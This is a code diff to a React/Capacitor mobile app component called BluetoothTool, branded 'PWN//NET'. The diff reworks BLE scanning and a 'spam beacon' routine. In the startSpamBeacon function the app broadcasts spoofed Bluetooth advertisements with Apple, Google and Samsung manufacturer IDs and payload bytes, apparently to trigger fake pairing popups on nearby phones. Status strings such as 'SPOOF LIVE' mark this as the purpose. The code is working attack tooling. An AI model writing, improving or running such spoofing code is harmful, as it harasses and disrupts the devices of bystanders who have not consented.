@@ -1020,12 +1020,16 @@ function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }
 
   const killActive = async () => {
     if (!Capacitor.isNativePlatform()) return;
-    try { await BleClient.stopLEScan(); } catch(e) {}
-    try { await BleClient.stopAdvertising(); } catch(e) {}
+    setMessage('Hardware Reset...');
+    try {
+      // Mandatory stop for all BLE subsystems
+      await BleClient.stopLEScan().catch(() => {});
+      await BleClient.stopAdvertising().catch(() => {});
+    } catch(e) {}
     setScanning(false);
     setSpamming(false);
-    // Give hardware a breather
-    await new Promise(r => setTimeout(r, 400));
+    // Increased delay for hardware stabilization
+    await new Promise(r => setTimeout(r, 1200));
   };
 
   const startScan = async () => {
@@ -1033,11 +1037,10 @@ function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }
     try {
       if (Capacitor.isNativePlatform()) {
         await killActive();
-        setMessage('Initializing...');
         await ensureBleEnabled();
 
         setScanning(true);
-        setMessage('Listening...');
+        setMessage('Sniffing Packets...');
         
         await BleClient.requestLEScan({
           allowDuplicates: false
@@ -1063,7 +1066,7 @@ function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }
         }, 15000);
       } else {
         if (!('bluetooth' in navigator)) {
-          setMessage('Web BT Unsupported.');
+          setMessage('Web BT Link Fail.');
           setScanning(false);
           return;
         }
@@ -1073,32 +1076,27 @@ function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }
         setScanning(false);
       }
     } catch (error: any) {
-      setMessage('BT Error: ' + (error.message || 'Busy'));
+      setMessage('BT Stack Busy. Toggle BT.');
       setScanning(false);
     }
   };
 
   const startSpamBeacon = async (type: 'apple' | 'google' | 'samsung') => {
     if (!Capacitor.isNativePlatform()) {
-      setMessage('Native Hardware Required.');
+      setMessage('Requires Native HW.');
       return;
     }
     try {
+      await killActive();
       setSpamming(true);
-      setMessage(`Locking Hardware...`);
+      setMessage(`Priming ${type.toUpperCase()}...`);
 
-      // 1. Mandatory Kill
-      try { await BleClient.stopLEScan(); } catch(e) {}
-      try { await BleClient.stopAdvertising(); } catch(e) {}
+      await ensureBleEnabled();
 
-      // 2. Hardware cooldown
+      // Cooldown after enabling
       await new Promise(r => setTimeout(r, 800));
 
-      // 3. Re-Init engine
-      setMessage(`Priming ${type.toUpperCase()}...`);
-      try { await BleClient.initialize(); } catch(e) {}
-
-      let mId = 0x004c; // Default Apple
+      let mId = 0x004c; // Apple
       let mData: number[] = [0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30];
 
       if (type === 'google') {
@@ -1109,21 +1107,17 @@ function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }
         mData = [0x42, 0x09, 0x81, 0x02];
       }
 
-      // 4. Advertising Execution
-      try {
-        await BleClient.startAdvertising({
-          name: 'PWN//NET',
-          services: [],
-          manufacturerId: mId,
-          manufacturerData: mData
-        });
-        setMessage(`BROADCAST LIVE: ${type.toUpperCase()}`);
-      } catch (innerErr: any) {
-        setMessage('Driver Error: Cycle BT.');
-        setSpamming(false);
-      }
+      await BleClient.startAdvertising({
+        name: 'PWN//NET',
+        services: [],
+        manufacturerId: mId,
+        manufacturerData: mData
+      });
+
+      setMessage(`SPOOF LIVE: ${type.toUpperCase()}`);
     } catch (error: any) {
-      setMessage('Hardware Busy: Retry.');
+      console.error('BLE SPAM FAIL', error);
+      setMessage('Driver Conflict. Toggle BT.');
       setSpamming(false);
     }
   };
